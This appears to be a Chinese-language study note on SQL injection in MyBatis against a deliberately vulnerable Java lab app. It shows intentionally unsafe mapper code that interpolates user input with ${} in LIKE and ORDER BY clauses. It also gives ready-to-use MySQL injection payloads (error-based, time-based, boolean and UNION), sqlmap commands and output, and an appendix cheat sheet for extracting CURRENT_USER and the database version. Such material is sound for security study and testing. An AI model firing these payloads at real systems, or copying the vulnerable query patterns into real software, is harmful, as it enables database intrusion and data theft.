### like注入
Controller代码：
```java
    @GetMapping("/mybatis/vuln_like2")
    public List<User> mybatis_vuln_like2(@RequestParam("username") String username) {
        return userMapper.findByUserNameVulLike2(username);
    }
```

Mapper：
```java
    @Select("select * from users where username LIKE '%${username}%'")
    List<User> findByUserNameVulLike2(@Param("username") String username);
```

报错注入：
```
username=cqq' AND GTID_SUBSET(CONCAT(0x7171626a71,(SELECT (ELT(6688=6688,1))),0x7178787171),6688)-- QmbH
```
时间盲注：
```
username=cqq' AND (SELECT 4500 FROM (SELECT(SLEEP(5)))rkmI)-- nrTl
```
布尔盲注：
```
username=cqq' AND 8093=8093-- hhbc
```
UNION查询:
```
username=cqq' UNION ALL SELECT NULL,NULL,CONCAT(0x7171626a71,0x53567546675441424d4f707864784d504f5975505149676d76464d6c484149495453506978487961,0x7178787171)-- -
``

### order by注入

Controller:
```java
    @GetMapping("/mybatis/vuln_order3")
    public List<User> mybatis_vuln_order3(@RequestParam("sortName") String sortName, @RequestParam("sortType") String sortType) {
        return (List<User>) userMapper.OrderByVuln3(sortName, sortType);
    }
```

Mapper：
```xml
    <select id="OrderByVuln3" resultMap="User">
        select * from users order by ${sortName} ${sortType}
    </select>
```
分析：
sortType这个参数有效的值要么为空，要么为desc（倒序）。
sortName需要知道一个有效的column值，如果不知道，burp只能扫出来疑似的SQL注入，
![a8cb08db0dd997b44f2be00c7250812](https://user-images.githubusercontent.com/30398606/142969552-98d283cd-a135-4899-b4f0-4693a871234f.png)

![image](https://user-images.githubusercontent.com/30398606/142969068-301ff63e-97ef-46af-b119-5fa9e8266b42.png)


而sqlmap扫不出来：
![5b3ceef64642d438864e335e1988644](https://user-images.githubusercontent.com/30398606/142968975-5c289458-d161-4458-a7a1-fbe499fc9027.png)

![64d0bec1e5d77995bdfe08a76f153dd](https://user-images.githubusercontent.com/30398606/142968981-7073514a-bf63-4408-95ee-dbf4a25c1e82.png)


当找到有效的column之后：`username`
响应会返回有效的数据，而不是报错：
![image](https://user-images.githubusercontent.com/30398606/142969830-2140adab-0f69-4058-8f22-04546658321d.png)


sqlmap结果：
```
Parameter: sortName (GET)
    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: sortName=username||(SELECT 0x4b76696f FROM DUAL WHERE 3545=3545 AND GTID_SUBSET(CONCAT(0x716a6b7071,(SELECT (ELT(6834=6834,1))),0x71706a6a71),6834))||&sortType=b

```

加上自定义的sql查询：
```
python3 sqlmap.py -u "http://cqq.com:8888/sqli/mybatis/vuln_order3?sortName=username&sortType=desc" -p "sortName,sortType" -H "Cookie: JSESSIONID=CC27180CE82569714649EBB975D71078" --dbms=MYSQL --sql-query="select database()"
```

报错注入payload：
```
/sqli/mybatis/vuln_order3?sortName=username%20OR%20GTID_SUBSET%28CONCAT%280x7162786a71%2C%28SELECT%20MID%28%28IFNULL%28CAST%28version%28%29%20AS%20NCHAR%29%2C0x20%29%29%2C1%2C190%29%29%2C0x7178706a71%29%2C8596%29&sortType=desc
```
解码之后：
```
sortName=username OR GTID_SUBSET(CONCAT(0x7162786a71,(SELECT MID((IFNULL(CAST(version() AS NCHAR),0x20)),1,190)),0x7178706a71),8596)&sortType=desc
```

## SQL注入发生在查询的不同位置
### SQL injection in different parts of the query

> Most SQL injection vulnerabilities arise within the `WHERE` clause of a SELECT query. This type of SQL injection is generally well-understood by experienced testers.

**But SQL injection vulnerabilities can in principle occur at any location within the query, and within different query types**. The most common other locations where SQL injection arises are:

- In `UPDATE` statements, within the updated values or the WHERE clause.
- In `INSERT` statements, within the inserted values.
- In `SELECT` statements, within the table or column name.
- In `SELECT` statements, within the ORDER BY clause.

## 附录
### 常用payload
```
时间盲注payload：
(select*from(select(sleep(5)))a)
and (select*from(select(sleep(5)))a)
or (select*from(select(sleep(5)))a)


报错注入payload：
AND extractvalue(1,concat(0x7e,CURRENT_USER,0x7e,CURRENT_USER))
OR extractvalue(1,concat(0x7e,CURRENT_USER,0x7e,CURRENT_USER))

AND updatexml(0,concat(0x7c,CURRENT_USER),1)


盲注爆破：
test'+or(select+length(CURRENT_USER))=16+or+'1'='2    # 爆破CURRENT_USER长度

or (select position('root1' in CURRENT_USER))=1    # 在条件语句中爆破CURRENT_USER
or (select position('root' in CURRENT_USER))=1

or '1'='2    # 利用任意一个false语句闭合后面的单引号
```


### 常用命令
```
python3 sqlmap.py -r sql.txt --force-ssl  --level=5 --risk=3 --threads=3 --dbms=MYSQL
```
